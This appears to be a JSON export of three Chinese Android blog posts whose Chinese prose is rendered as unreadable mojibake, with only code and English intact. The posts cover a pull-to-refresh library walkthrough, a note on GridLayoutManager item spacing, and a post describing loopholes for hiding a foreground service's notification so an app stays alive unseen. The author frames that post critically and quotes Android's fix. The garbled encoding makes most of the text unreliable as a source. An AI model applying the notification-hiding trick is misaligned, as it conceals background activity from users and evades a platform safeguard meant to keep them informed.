mPtrUIHandlerHolder.onUIRefreshPrepare(this);//åˆšå¼€å§‹å¾€ä¸‹ç§»ä¸€ç‚¹ç‚¹æˆ–è€…åˆšåˆšä»ä¸‹é¢å›åˆ°0çš„ä½ç½®ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯ä¸‹æ‹‰åˆ·æ–°åˆšå¼€å§‹å’Œåˆšç»“æŸçš„æ—¶å€™ã€‚è¿™ä¸ªHolderçš„ç»“æ„ç±»ä¼¼äºä¸€ä¸ªé“¾è¡¨ï¼Œä¸€ä¸ªHolderé‡Œé¢æœ‰UIHandlerï¼Œä»¥åŠä¸‹ä¸€ä¸ªHolder(next)ã€‚ä½œç”¨ç±»ä¼¼äºä¸€ä¸ªé›†åˆï¼Œç­‰äºä½œè€…è‡ªå·±å®ç°äº†è¿™æ ·ä¸€ä¸ªä¸æ–­å¾ªç¯çš„æ¶ˆæ¯åˆ—è¡¨(çœ‹èµ·æ¥æŒºåƒMessageçš„)ã€‚è¿™ä¸ªHolderçš„ä½œç”¨åœ¨äºå¯ä»¥åŠ¨æ€æ·»åŠ UIHanlderï¼Œç›¸å¯¹åº”çš„æ–¹æ³•éƒ½åšå¥½äº†(addHandler)ã€‚ //å†æ¬¡å¼ºè°ƒï¼Œè¿™é‡Œè¡¨ç¤º**åˆšå¼€å§‹å¾€ä¸‹ç§»ä¸€ç‚¹ç‚¹æˆ–è€…åˆšåˆšä»ä¸‹é¢å›åˆ°0çš„ä½ç½®ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯ä¸‹æ‹‰åˆ·æ–°åˆšå¼€å§‹å’Œåˆšç»“æŸçš„æ—¶å€™ã€‚æ­¤æ—¶çš„çŠ¶æ€ä¸ºSTATUS_PREPARED** } // back to initiated position if (mPtrIndicator.hasJustBackToStartPosition()) { tryToNotifyReset(); //**åˆšåˆšä»ä¸‹é¢å›åˆ°0çš„ä½ç½®ï¼Œé€šçŸ¥UIHandlerçš„onUIReset()æ–¹æ³•,æ­¤æ—¶çš„çŠ¶æ€ä¸ºSTATUS_INIT** //å°†æ•´ä¸ªè¿‡ç¨‹åˆ’åˆ†çš„çœŸè¯¦ç»† // recover event to childrenï¼Œè™½ç„¶æ‰‹æŒ‡è¿˜åœ¨å±å¹•ä¸Šï¼Œå¤„äºACTION_MOVEï¼Œä½†è¿™é‡Œç”±äºå·²ç»å¤ä½ï¼Œéœ€è¦æŠŠACTION_DOWNä¼ é€’ä¸‹å»ï¼Œè¿™ä¸€æ®µæ¯”è¾ƒå¤æ‚ã€‚ if (isUnderTouch) { sendDownEvent(); } } // Pull to Refresh if (mStatus == PTR_STATUS_PREPARE) {//ä»ä¸Šåˆ°ä¸‹ä¾æ¬¡ä¸º0 ï¼Œ å‡ºç°åŠ¨ç”»ä¸´ç•Œå€¼ï¼Œ HeadViewé«˜åº¦ // reach fresh height while moving from top to bottom if (isUnderTouch &amp;&amp; !isAutoRefresh() &amp;&amp; mPullToRefresh // æ‰‹æŒ‡è¿˜åœ¨å±å¹•ä¸Šï¼Œä¸æ˜¯è‡ªåŠ¨åˆ·æ–°ä¸”å…è®¸pträ¸”åˆ°è¾¾äº†ä¸‹æ»‘å‡ºç°åŠ¨ç”»æ•ˆæœçš„ä¸´ç•Œå€¼ï¼Œæ¡ä»¶è¿˜æ˜¯æ¯”è¾ƒè‹›åˆ»çš„ &amp;&amp; mPtrIndicator.crossRefreshLineFromTopToBottom()) { tryToPerformRefresh(); } // reach header height while auto refresh if (performAutoRefreshButLater() &amp;&amp; mPtrIndicator.hasJustReachedHeaderHeightFromTopToBottom()) {//åˆšåˆšè¶…è¿‡headerViewé«˜åº¦ä¸€ä¸ç‚¹ tryToPerformRefresh(); } } //tryToPerformRefresh()æ–¹æ³•åˆ¤æ–­mPtrIndicator.isOverOffsetToRefresh()ï¼Œæ»¡è¶³æ¡ä»¶çš„è¯è¿›å…¥STATUS_LOADINGï¼Œè¿™ä¸ªæ—¶å€™å°±è¦å¼€å§‹è®©åŠ¨ç”»runäº†ã€‚æ‰€ä»¥è¿™é‡Œè°ƒç”¨çš„æ˜¯ mPtrUIHandlerHolder.onUIRefreshBegin(this);å’ŒmPtrHandler.onRefreshBegin(this);å‰è€…æ˜¯åæ¥æ‰‹åŠ¨æ·»åŠ çš„UIHandlerï¼Œåè€…åˆ™æ˜¯åœ¨onInFlateFinishä¸­è‡ªè¡Œåˆ¤æ–­çš„ï¼Œè¿™ä¸¤ä¸ªéƒ½ä¼šè¢«æ‰§è¡Œã€‚è¿™é‡Œæ‰¯ä¸€å¥ï¼Œè¿™ä¸ªHolderå°±åƒä¸€ä¸ªä¸­é—´å±‚ï¼ŒæŒæœ‰äº†UIHandler,æ‰€æœ‰æ–¹æ³•éƒ½è°ƒç”¨çš„æ˜¯åè€…HanldleUIçš„æ–¹æ³•ã€‚facadeæ¨¡å¼ï¼Ÿ // ç»ˆäºçœ‹åˆ°å®é™…è°ƒç”¨Viewæ»‘åŠ¨çš„ä»£ç äº†ï¼Œè®©ä¸€ä¸ªViewæ»‘åŠ¨çš„æ–¹å¼æœ‰å¾ˆå¤šç§ï¼Œè¿™é‡Œé‡‡ç”¨çš„æ˜¯æ”¹å˜X,Yçš„æ–¹å¼(X = left+translationX;Y = top+translationY) mHeaderView.offsetTopAndBottom(change); if (!isPinContent()) { mContent.offsetTopAndBottom(change); } invalidate();??æˆ‘è§‰å¾—è¿™é‡Œå¥½åƒæ²¡æœ‰å¿…è¦è¿™ä¹ˆé¢‘ç¹çš„è°ƒè¿™ä¸€å¥è¯ //ç§»åŠ¨å®Œæˆä¹‹åé€šçŸ¥UIHandlerHolderä½ç½®æ”¹å˜äº†ï¼Œæ²¡æœ‰é€šçŸ¥mUIHandleræ˜¯å› ä¸ºåè€…å°±æ˜¯mContentå’ŒmHeaderViewã€‚ if (mPtrUIHandlerHolder.hasHandler()) { mPtrUIHandlerHolder.onUIPositionChange(this, isUnderTouch, mStatus, mPtrIndicator); } onPositionChange(isUnderTouch, mStatus, mPtrIndicator);//æœ€åè¿˜é¢„ç•™äº†ä¸€ä¸ªonPositionChangeçš„ç©ºæ–¹æ³•ï¼Œå­ç±»å¯èƒ½ä¼šæœ‰ç‚¹ç”¨å§ } åˆ°è¿™é‡Œï¼ŒACTION_MOVEå·²ç»ç ”ç©¶å®Œæ¯•ï¼Œå¤§éƒ¨åˆ†çš„åˆ†æéƒ½åœ¨æ³¨é‡Šé‡Œé¢ï¼Œåªè¦åˆ†æ¸…æ¥šæ»‘åŠ¨è¿‡ç¨‹ä¸­çš„å„ç§STATUSï¼Œæˆ‘è§‰å¾—è¿˜æ˜¯æ¯”è¾ƒå¥½ç†è§£çš„ã€‚MOVEè¿‡ç¨‹ä¸­ä¼´éšç€è·ç¦»çš„å˜åŒ–ï¼Œpträ¹Ÿè¿›å…¥ä¸åŒçš„statusï¼Œptræœ¬èº«å…¶å®åªåšäº†ç§»åŠ¨headrViewå’ŒchildViewçš„å·¥ä½œï¼Œå®é™…çš„åŠ¨ç”»æ•ˆæœç­‰ç­‰éƒ½æ˜¯ç”±UIHanlderæ‹¿ç€ptrçš„å®ä¾‹å»åšçš„ã€‚å…³äºèƒ½å¤Ÿæ»‘åŠ¨å¤šå°‘è·ç¦»çš„é—®é¢˜ï¼Œç”±äºè¿™é‡Œå¹¶æ²¡æœ‰åˆ¤æ–­ï¼Œæ‰€ä»¥ï¼Œè¿™ä¸ªcontentViewçš„ä¸‹æ»‘æ˜¯æ²¡æœ‰ä¸‹é™çš„ï¼Œä¸è¿‡åœ¨xmlé‡Œé¢æœ‰ä¸€ä¸ªè‡ªå®šä¹‰çš„resistanceï¼Œç›¸å½“äºé˜»åŠ›ç³»æ•°äº†ï¼Œè®¾ç½®å¤§ä¸€ç‚¹çš„è¯å°±ä¸ä¼šå‡ºäº‹ã€‚ç›®å‰æ‰‹æŒ‡è¿˜åœ¨å±å¹•ä¸Šï¼Œstatusç­‰äºSTATUS_PREPAREDæˆ–è€…STATUS_LOADINGã€‚å€Ÿç”¨æ‰‹æœºè¯„æµ‹é‚£å¸®äººçš„è¯æ¥è¯´ï¼Œè·Ÿæ‰‹ ACTION_UPï¼š mPtrIndicatorä¸­çš„mPressedè®¾ç½®ä¸ºfalseï¼Œæ ‡ç¤ºä¸‹å½“å‰æ‰‹æŒ‡å·²ç»ä¸æŒ‰åœ¨å±å¹•ä¸Šäº†ã€‚å¦‚æœè¿™æ—¶å€™çš„ä½ç½®&gt;0ï¼Œå°±æ˜¯contentViewè¿˜æ²¡æœ‰å¤ä½ï¼Œéœ€è¦æƒ³åŠæ³•è®©å®ƒâ€å¼¹å›æ¥â€ï¼Œè¿™éƒ¨åˆ†å·¥ä½œäº¤ç»™äº†onRelease(false)ï¼Œè¿™ä¸ªfalseæˆ‘çŒœè‚¯å®šæ˜¯åé¢åŠ ä¸Šå»çš„(æŸ¥äº†ä¸‹git logæœç„¶ã€‚ã€‚ã€‚)ã€‚æ¥çœ‹OnRelease: private void onRelease(boolean stayForLoading) { tryToPerformRefresh();//ä¼šæ£€æŸ¥ä¸‹å½“å‰status!=STATUS_PREPAREDçš„è¯ç›´æ¥return falseï¼Œå°±æ˜¯ä¸æ˜¯åœ¨åˆšå¼€å§‹æˆ–åˆšå¤ä½çš„æƒ…å†µä¸‹ä¸åšï¼›å¦åˆ™ç»§ç»­æ‰§è¡ŒperformRefreshæ“ä½œï¼Œå…¶å®è¿™æ ·æƒ³ä¹Ÿç¬¦åˆå¸¸ç†ï¼Œæ‰‹æŒ‡ç¦»å¼€äº†å±å¹•ï¼Œptråº”è¯¥èƒ½å¤Ÿè‡ªæˆ‘åˆ¤æ–­æ˜¯å¦è¿˜éœ€è¦æ‰§è¡ŒåŠ¨ç”» if (mStatus == PTR_STATUS_LOADING) { // keep header for fresh if (mKeepHeaderWhenRefresh) { // scroll header back if (mPtrIndicator.isOverOffsetToKeepHeaderWhileLoading() &amp;&amp; !stayForLoading) {//å·²ç»è¿‡äº†éœ€è¦åŠ è½½åŠ¨ç”»çš„ä½ç½®ï¼ŒstatyForLoadingè¿™é‡Œä¼ è¿›æ¥çš„æ˜¯false mScrollChecker.tryToScrollTo(mPtrIndicator.getOffsetToKeepHeaderWhileLoading(), mDurationToClose);//æ»‘åŠ¨åˆ°åŠ è½½åŠ¨ç”»çš„ä½ç½®ï¼Œè¿™é‡Œé¢æ˜¯ä¸æ–­åœ°postä¸€ä¸ªrunnableï¼Œåœ¨runæ–¹æ³•é‡Œé¢è°ƒç”¨ä¹‹å‰å’ŒACTION_MOVEé‡Œé¢ä¸€æ ·çš„é‚£ä¸ªmovePosæ–¹æ³•ï¼Œæ‰€ä»¥é‡ç”¨æ€§è¿˜å¥½ã€‚ä¹Ÿä¼šé€šçŸ¥ç›¸åº”çš„UIHandleræˆ–è€…UIHandlerHolder } else { // do nothing } } else { tryScrollBackToTopWhileLoading();//è¿™é‡Œä¼šä¸€ç›´æ»‘åŠ¨åˆ°0çš„ä½ç½®ï¼Œå…¶å®ä¹Ÿæ˜¯ä¸æ–­è°ƒç”¨updatPosæ–¹æ³•ï¼Œä¼šå°†STATUSé‡ç½®ä¸ºSTATUS_INITæˆ–è€…STATUS_PREPARED } } else { if (mStatus == PTR_STATUS_COMPLETE) {//STATUS_COMPLETEé€šå¸¸ç”±å¤–éƒ¨è°ƒç”¨è€…è°ƒç”¨refreshComplete public æ–¹æ³•è®¾ç½®ï¼Œç›¸å½“äºSwipeRefreshLayoutçš„setRefreshing()ï¼Œå¦åˆ™å°†ä¸€ç›´åœç•™åœ¨åŠ è½½çŠ¶æ€ã€‚ä¹Ÿå°±æ˜¯è¯´éœ€è¦è°ƒç”¨è€…æ‰‹åŠ¨è®¾ç½®å…³é—­ï¼Œè¿™ä¹Ÿç¬¦åˆå¸¸ç†ï¼Œå› ä¸ºåŠ è½½æœ¬èº«æ˜¯éœ€è¦æ—¶é—´çš„ï¼ŒæŠŠè¿™ä¸ªè®¾ç½®çš„æ—¶æœºäº¤ç»™å¼€å‘è€…æ¥æ‰‹åŠ¨è®¾ç½®å‡ ä¹æ˜¯å”¯ä¸€çš„é€‰æ‹©ã€‚ notifyUIRefreshComplete(false); } else { tryScrollBackToTopAbortRefresh(); } } } åˆ°æ­¤ï¼Œptrå†…éƒ¨åªå‰©ä¸‹ä¸€äº›getterå’Œsetteräº†ï¼Œä¸å†è§£é‡Šï¼Œç»“åˆDemoä½¿ç”¨å°±ä¼šæœ‰æ‰€ä½“ä¼šã€‚ 3. æ€»ç»“ptrçš„æœ¬è´¨å°±æ˜¯é€šè¿‡ViewGroupçš„dispatchTouchEventå°†äº‹ä»¶æ‹¦æˆªåœ¨å†…éƒ¨è¿›è¡Œå¤„ç†ï¼Œå¹¶å°†äº‹ä»¶è¿‡ç¨‹åˆ†å‘ç»™å‡ ä¸ªè‡ªå®šä¹‰çš„æ¥å£ã€‚è€Œå†…éƒ¨åˆæ·»åŠ äº†ä¸€äº›è‡ªå®šä¹‰çš„å˜é‡ï¼Œå¹¶ç»™å‡ºgetterå’Œsetterï¼Œä½¿å¾—å¤–éƒ¨è°ƒç”¨è€…ä½¿ç”¨èµ·æ¥ååˆ†è½»æ¾ã€‚åªè¦æŒæ¡å¥½äº‹ä»¶åˆ†å‘å¤„ç†å’ŒViewçš„ç»˜åˆ¶æµç¨‹ï¼Œæ‹†èµ·æ¥è¿˜ç®—ç®€å•ã€‚å½“ç„¶ï¼Œå¦‚æœåœ¨å®é™…é¡¹ç›®ä¸­ç¢°åˆ°äº†ç±»ä¼¼çš„éœ€æ±‚ï¼Œæˆ‘å€¾å‘äºå®šåˆ¶ä¸€ä¸ªç®€å•ä¸€ç‚¹çš„å°å·¥å…·ã€‚","tags":[{"name":"ç½®é¡¶","slug":"ç½®é¡¶","permalink":"https://haldir65.github.io/tags/ç½®é¡¶/"}]},{"title":"è®©serviceå¸¸é©»åå°çš„æ–¹æ³•","date":"2016-10-20T21:35:10.000Z","path":"2016/10/20/2016-10-20-android-dirty-code/","text":"ä»Šå¤©åœ¨V2EXä¸Šçœ‹åˆ°æœ‰äººæåˆ°Notificationæœ‰æ¼æ´ï¼Œå¥½å¥‡ä¹Ÿå°±æŸ¥äº†ä¸€ä¸‹ï¼Œç»“æœå‘ç°æœ‰äººä¸“é—¨é’ˆå¯¹è¿™ä¸ªé—®é¢˜è¿›è¡Œäº†åˆ†æã€‚æœ¬èº«çš„æŠ€æœ¯åˆ†æå¹¶ä¸å¤šï¼Œå†™åœ¨è¿™é‡Œåªæ˜¯ä¸ºäº†ä½œä¸ºä»Šåçš„ä¸€ä¸ªå‚è€ƒã€‚ 1. é—®é¢˜çš„ç”±æ¥Androidå¯¹åå°åº”ç”¨æ˜¯æœ‰ä¸€ä¸ªæƒé‡åŒºåˆ†çš„ï¼Œæœ€ç›´è§‚çš„å°±æ˜¯æŸ¥çœ‹æœ€è¿‘ä½¿ç”¨çš„åº”ç”¨ï¼Œè¿™é‡Œæ¯ä¸€ä¸ªåº”ç”¨å¯èƒ½æœ‰ä¸€ä¸ªæˆ–è€…å¤šä¸ªProcessï¼Œè€Œç³»ç»Ÿåœ¨èµ„æºç´§å¼ æ—¶ä¼šå¹²æ‰ä¸€äº›Processï¼Œè€Œå†³å®šåå°åº”ç”¨ç”Ÿæ­»çš„æ˜¯ä¸€ä¸ªLru Listï¼Œä¹Ÿå°±æ˜¯least recently used ä¼šè¢«å¹²æ‰ã€‚æ˜¾ç„¶å¤§å®¶éƒ½ä¸å¸Œæœ›è‡ªå·±è¢«å¹²æ‰ï¼ŒDAUå¯¹äºå¾ˆå¤šåº”ç”¨æ¥è¯´æ˜¯ä¼˜å…ˆäºç³»ç»Ÿèµ„æºå’Œç”¨æˆ·ä½“éªŒçš„ã€‚æ ¹æ®å®˜æ–¹æ–‡æ¡£,Android Processæœ‰äº”ç§ï¼Œæ ¹æ®ä¼˜å…ˆçº§ä»é«˜åˆ°ä½ä¸º: å‰å°è¿›ç¨‹ å¯è§è¿›ç¨‹ æœåŠ¡è¿›ç¨‹ åå°è¿›ç¨‹ ç©ºè¿›ç¨‹ è¶Šé å‰çš„è¿›ç¨‹å°±è¶Šä¸å®¹æ˜“è¢«ç³»ç»Ÿå¹²æ‰ï¼Œæ‰€ä»¥å¤§å®¶éƒ½å¸Œæœ›èƒ½å¤Ÿæˆä¸ºå‰å°è¿›ç¨‹ã€‚æˆä¸ºå‰å°è¿›ç¨‹çš„æ¡ä»¶: ç”¨æˆ·å½“å‰æ“ä½œæ‰€å¿…éœ€çš„è¿›ç¨‹ã€‚å¦‚æœä¸€ä¸ªè¿›ç¨‹æ»¡è¶³ä»¥ä¸‹ä»»ä¸€æ¡ä»¶ï¼Œå³è§†ä¸ºå‰å°è¿›ç¨‹ï¼š æ‰˜ç®¡ç”¨æˆ·æ­£åœ¨äº¤äº’çš„ Activityï¼ˆå·²è°ƒç”¨ Activity çš„ onResume() æ–¹æ³•ï¼‰ æ‰˜ç®¡æŸä¸ª Serviceï¼Œåè€…ç»‘å®šåˆ°ç”¨æˆ·æ­£åœ¨äº¤äº’çš„ Activity æ‰˜ç®¡æ­£åœ¨â€œå‰å°â€è¿è¡Œçš„ Serviceï¼ˆæœåŠ¡å·²è°ƒç”¨ startForeground()ï¼‰ æ‰˜ç®¡æ­£æ‰§è¡Œä¸€ä¸ªç”Ÿå‘½å‘¨æœŸå›è°ƒçš„ Serviceï¼ˆonCreate()ã€onStart() æˆ– onDestroy()ï¼‰ æ‰˜ç®¡æ­£æ‰§è¡Œå…¶ onReceive() æ–¹æ³•çš„ BroadcastReceiver é€šå¸¸ï¼Œåœ¨ä»»æ„ç»™å®šæ—¶é—´å‰å°è¿›ç¨‹éƒ½ä¸ºæ•°ä¸å¤šã€‚åªæœ‰åœ¨å†…åœ¨ä¸è¶³ä»¥æ”¯æŒå®ƒä»¬åŒæ—¶ç»§ç»­è¿è¡Œè¿™ä¸€ä¸‡ä¸å¾—å·²çš„æƒ…å†µä¸‹ï¼Œç³»ç»Ÿæ‰ä¼šç»ˆæ­¢å®ƒä»¬ã€‚ æ­¤æ—¶ï¼Œè®¾å¤‡å¾€å¾€å·²è¾¾åˆ°å†…å­˜åˆ†é¡µçŠ¶æ€ï¼Œå› æ­¤éœ€è¦ç»ˆæ­¢ä¸€äº›å‰å°è¿›ç¨‹æ¥ç¡®ä¿ç”¨æˆ·ç•Œé¢æ­£å¸¸å“åº”ã€‚ ä»¥ä¸Šæ¡ä»¶åªæœ‰startForegroundæ»¡è¶³æ¡ä»¶äº†ï¼Œä½†å¤§å®¶éƒ½çŸ¥é“startForegroundä¼šåœ¨é€šçŸ¥æ å¸¸é©»ä¸€ä¸ªNotificationï¼Œä¸”ç”¨æˆ·å–æ¶ˆä¸äº†ã€‚å¯¹äºæˆ‘è¿™ç§å¼ºè¿«ç—‡æ¥è¯´å®åœ¨æ˜¯å¤ªä¸‘ã€‚ 2. startForegroundä¸€å®šä¼šåœ¨ç³»ç»ŸçŠ¶æ€æ æ˜¾ç¤ºä¸€ä¸ªé€šçŸ¥ï¼ŒçœŸçš„å—?void startForeground (int id, Notification notification) æˆ‘æ‰¾åˆ°äº†G+ä¸Šçš„Chris Banesçš„ä¸€ç¯‡postï¼Œè¿™å…¶ä¸­æ˜ç¡®æŒ‡å‡º Unfortunately there are a number of applications on Google Play which are using the startForeground() API without passing a valid notification. While this worked in previous versions of Android, it is a loophole which has been fixed in Android 4.3. The system now displays a notifications for you automatically if you do not provide a valid one. ä¹Ÿå°±æ˜¯è¯´ï¼ŒAPI 18ä»¥å‰ï¼Œåªéœ€è¦æä¾›ä¸€ä¸ªæ— æ•ˆçš„Notificationå°±å¯ä»¥è®©Notificationä¸æ˜¾ç¤ºäº†ã€‚æ‰€ä»¥ï¼Œåˆ¤æ–­ä¸‹API&lt;18çš„æ—¶å€™ï¼Œç›´æ¥new Notification()å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªä¸å®Œæ•´çš„Notification.æ–‡ç« ä¹ŸæŒ‡å‡ºäº†è¿™æ˜¯ä¸€ä¸ªLoopholeï¼ˆå·²ç»æ˜¯ä¸ªè´¬ä¹‰è¯äº†ï¼‰ã€‚Api 18ä¹‹åçš„ä¿®å¤æªæ–½ï¼Œçœ‹ServiceRecordçš„æºç : public void postNotification() { final int appUid = appInfo.uid; final int appPid = app.pid; if (foregroundId != 0 &amp;&amp; foregroundNoti != null) { // Do asynchronous communication with notification manager to // avoid deadlocks. final String localPackageName = packageName; final int localForegroundId = foregroundId; final Notification localForegroundNoti = foregroundNoti; ams.mHandler.post(new Runnable() { public void run() { NotificationManagerService nm = (NotificationManagerService) NotificationManager.getService(); if (nm == null) { return; } try { if (localForegroundNoti.icon == 0) { // It is not correct for the caller to supply a notification // icon, but this used to be able to slip through, so for // those dirty apps give it the app&#39;s icon. localForegroundNoti.icon = appInfo.icon; // Do not allow apps to present a sneaky invisible content view either. localForegroundNoti.contentView = null; localForegroundNoti.bigContentView = null; CharSequence appName = appInfo.loadLabel( ams.mContext.getPackageManager()); if (appName == null) { appName = appInfo.packageName; } Context ctx = null; try { ctx = ams.mContext.createPackageContext( appInfo.packageName, 0); Intent runningIntent = new Intent( Settings.ACTION_APPLICATION_DETAILS_SETTINGS); runningIntent.setData(Uri.fromParts(&quot;package&quot;, appInfo.packageName, null)); PendingIntent pi = PendingIntent.getActivity(ams.mContext, 0, runningIntent, PendingIntent.FLAG_UPDATE_CURRENT); localForegroundNoti.setLatestEventInfo(ctx, ams.mContext.getString( com.android.internal.R.string .app_running_notification_title, appName), ams.mContext.getString( com.android.internal.R.string .app_running_notification_text, appName), pi); } catch (PackageManager.NameNotFoundException e) { localForegroundNoti.icon = 0; } } if (localForegroundNoti.icon == 0) { // Notifications whose icon is 0 are defined to not show // a notification, silently ignoring it. We don&#39;t want to // just ignore it, we want to prevent the service from // being foreground. throw new RuntimeException(&quot;icon must be non-zero&quot;); } int[] outId = new int[1]; nm.enqueueNotificationInternal(localPackageName, localPackageName, appUid, appPid, null, localForegroundId, localForegroundNoti, outId, userId); } catch (RuntimeException e) { Slog.w(ActivityManagerService.TAG, &quot;Error showing notification for service&quot;, e); // If it gave us a garbage notification, it doesn&#39;t // get to be foreground. ams.setServiceForeground(name, ServiceRecord.this, 0, null, true); ams.crashApplication(appUid, appPid, localPackageName, &quot;Bad notification for startForeground: &quot; + e); } } }); } } å•å•æ˜¯çœ‹æ³¨é‡Šå¤§æ¦‚èƒ½çœ‹å‡ºæ¥Androidå›¢é˜Ÿå¯¹äºè¿™ç§åšæ³•çš„ä¸æ»¡ã€‚æ‰€ä»¥å¦‚æœä¸æä¾›æœ‰æ•ˆNotificationï¼Œåˆ™æ˜¾ç¤ºä½ çš„Appçš„Iconã€‚æ‰€ä»¥Api 18ä»¥ä¸Šä¸€å®šä¼šæ˜¾ç¤ºä¸€ä¸ªNotificationã€‚ ç„¶è€Œå¥—è·¯è¿˜æ˜¯å¤ªæ·±ã€‚ã€‚ã€‚ã€‚åˆæœ‰äººç»™å‡ºäº†API 18ä»¥ä¸Šçš„è§£å†³åŠæ³•:æˆ‘åœ¨è¿™é‡Œæ‰¾åˆ°äº†æ–°çš„æ–¹æ³•ï¼Œç®€å•æ¥è¯´å°±æ˜¯èµ·ä¸¤ä¸ªServiceï¼Œä¸¤ä¸ªServiceéƒ½åœ¨ä¸€ä¸ªè¿›ç¨‹é‡Œã€‚å…ˆStart A Service ï¼ŒonCreateé‡Œé¢ bind B Serviceï¼Œåœ¨onServiceConnectedçš„æ—¶å€™A service startForeground(processId,notification)B service startForeground(processId,notification)éšåç«‹å³è°ƒç”¨B service stopForeGround(true)ç”±äºä¸¤ä¸ªNotificationå…·æœ‰ç›¸åŒçš„idï¼Œæ‰€ä»¥A serviceæœ€ç»ˆæˆä¸ºForeground Serviceï¼ŒNotificationä¹Ÿè¢«æ¸…é™¤æ‰äº†ã€‚ 3.æœ€åæ•´ä¸ªè¿‡ç¨‹çœ‹ä¸‹æ¥ï¼ŒAPI 18ä»¥ä¸‹ï¼Œç»™ä¸€ä¸ªä¸å®Œæ•´çš„Notification(æ¯”å¦‚new Notification())ï¼Œå°±ä¸ä¼šå‡ºç°åœ¨é€šçŸ¥æ ï¼›API 18ä»¥ä¸Šï¼Œèµ·ä¸¤ä¸ªServiceï¼ŒB Serviceè´Ÿè´£å–æ¶ˆNotificationå°±å¯ä»¥äº†ã€‚ç›®å‰çœ‹æ¥ï¼Œå›½å†…å¾ˆå¤šAppä¸ºäº†ä¿æ´»ï¼Œéƒ½é‡‡å–äº†ç±»ä¼¼çš„æ–¹å¼ã€‚è€Œæ•´ä½“æŠ€æœ¯å±‚é¢çš„å®ç°å¹¶ä¸éš¾ï¼Œåªæ˜¯åˆ©ç”¨äº†ä¸€ä¸ªåˆä¸€ä¸ªå°æ¼æ´ç½¢äº†ã€‚æ‰€è°“è„ä»£ç ä¸è¿‡æ˜¯æŠ€æœ¯ä¸Šåšçš„ä¸€äº›æ¬ºéª—ç³»ç»Ÿçš„æ‰‹æ®µï¼Œä½œä¸ºå¼€å‘è€…ï¼Œç†åº”æ˜ç™½è°·æ­Œè®¾è®¡è¿™ä¸€å¥—ç³»ç»Ÿæ˜¯ä¸ºäº†æ›´å¥½çš„æå‡ç”¨æˆ·ä½“éªŒï¼ˆå æ®å¸‚åœºï¼‰ã€‚ç„¶è€Œåœ¨å½“å‰å›½å†…åº”ç”¨å¼€å‘ç¯å¢ƒä¸‹ï¼Œæˆ‘ä»¬çœŸçš„èƒ½å¤Ÿä¸ºç”¨æˆ·è€ƒè™‘è€ƒè™‘å—ï¼Œæˆ–è€…è¯´ï¼Œæˆ‘ä»¬æäº¤çš„ä»£ç èƒ½å—ï¼Ÿ updatesã€è…¾è®¯Buglyå¹²è´§åˆ†äº«ã€‘Android è¿›ç¨‹ä¿æ´»æ‹›å¼å¤§å…¨ CommonsWareè¡¨ç¤º Services are natural singletons ï¼ŒServiceéƒ½æ˜¯å•ä¾‹ Reference æ”¯ä»˜å®åå°ä¸æ­»çš„é»‘ç§‘æŠ€ Androidçš„startForegroundå‰å°Serviceå¦‚ä½•å»æ‰é€šçŸ¥æ˜¾ç¤º","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"è‡ªå®šä¹‰LayoutManager","date":"2016-10-20T16:37:42.000Z","path":"2016/10/20/2016-10-20-write-your-own-layoutmanager/","text":"1. ç³»ç»Ÿä¸ºæˆ‘ä»¬æä¾›äº†LinearLayoutManagerã€GridLayoutManagerå’ŒStaggeredGridLayoutManagerã€‚åŸºæœ¬ç”¨æ³•éƒ½å¾ˆç®€å•ï¼Œè¿™é‡Œè®°å½•ä¸€äº›é‡è¦çš„ç”¨æ³• GridLayoutManagerå¯ä»¥è®¾ç½®æŸä¸ªItemåœ¨æŸä¸€è¡Œå æ®çš„Column numï¼ˆVERTICALçš„æƒ…å†µä¸‹ï¼‰ä»£ç å¦‚ä¸‹: GridLayoutManager manager = new GridLayoutManager( this,2 ,GridLayoutManager.VERTICAL,false) manager.setSpanSizeLookup(){ new GridLayoutManager.SpanSizeLookup(){ @override public int getSpanSize(int position){ return (position % 3 == 0 ? 2 : 1) } } } ); æ‰€ä»¥ï¼Œä¸€å¼€å§‹å¯ä»¥æŠŠè¿™ä¸ª2è®¾ç½®å¤§ä¸€ç‚¹ï¼Œåé¢å¯ä»¥åŠ¨æ€è®¾ç½®ï¼Œçœ‹ä¸Šå»å°±ä¼šé€ æˆä¸€ç§å¤šç§æ ¼å­çš„é”™è§‰ã€‚ GridLayoutMangerçš„åŒä¸€è¡Œçš„ItemViewçš„itemHeightå¿…é¡»ä¸€è‡´ï¼Œå¦åˆ™åŒä¸€è¡Œçš„ItemViewåº•éƒ¨ä¼šå‡ºç°ç©ºéš™ã€‚è¿™ç§æƒ…å†µè¯·ä½¿ç”¨StaggeredGridLayoutManager å‘å‘1åœºæ™¯:ä¸€ä¸ªcolumnä¸º4çš„gridLayoutManagerï¼Œpositionä¸º0å’Œpositionä¸º3çš„itemçš„å·¦å³è¾¹è·æ˜¯20dpã€‚å…¶ä½™æ¯ä¸€ä¸ªitemä¹‹é—´çš„é—´éš”ä¸º10dpï¼Œæ‰‹æœºå±å¹•å®½åº¦ä¸º720px äºæ˜¯å°è¯•ç€è¿™æ ·å†™ val offset = 10 when (position%4) { 0 -&gt; outRect?.set(offset*2, 0, 0, 0) 1 -&gt; outRect?.set(offset, 0, 0, 0) 2 -&gt; outRect?.set(offset, 0, 0, 0) 3 -&gt; outRect?.set(offset, 0, offset*2, 0) } æ²¡æœ‰ç”¨ï¼Œ å¼ºåˆ¶åœ¨onCreateViewHodlerä¸­ä¿®æ”¹å®½åº¦ä¸º (screenWidth- 202 - 103)/4f ä¾æ—§æ²¡æœ‰ç”¨ å°†itemViewçš„å®½åº¦è®¾ç½®ä¸ºMatch_Parentä¹‹åï¼Œåˆ°æœ€åçš„ä¸€ä¸ªViewçš„å®½åº¦è¦å°äºå®é™…çš„å®½åº¦ ä¾æ—§æ²¡æœ‰ç”¨ ç»“è®ºä¼¼ä¹æ˜¯GridLayoutManagerä¸åº”è¯¥æ‰‹åŠ¨æŒ‡å®šitemViewçš„å®½åº¦ï¼Œå¦‚æœæƒ³è¦å®½åº¦ä¸€è‡´ï¼Œä½†æ˜¯ä¹‹é—´çš„gapåˆä¸ç›¸ç­‰ã€‚é‚£ä¹ˆæœ€å¥½ä¹Ÿæ˜¯æœ€ç®€å•çš„æ–¹æ³•æ˜¯åœ¨RecyclerViewä¸Šä¸‹æ‰‹ï¼Œè®©getItemItemOffsetä¸­è¿”å›ä¸€ä¸ªä¸€è‡´çš„rectå®½åº¦ GridLayoutManager 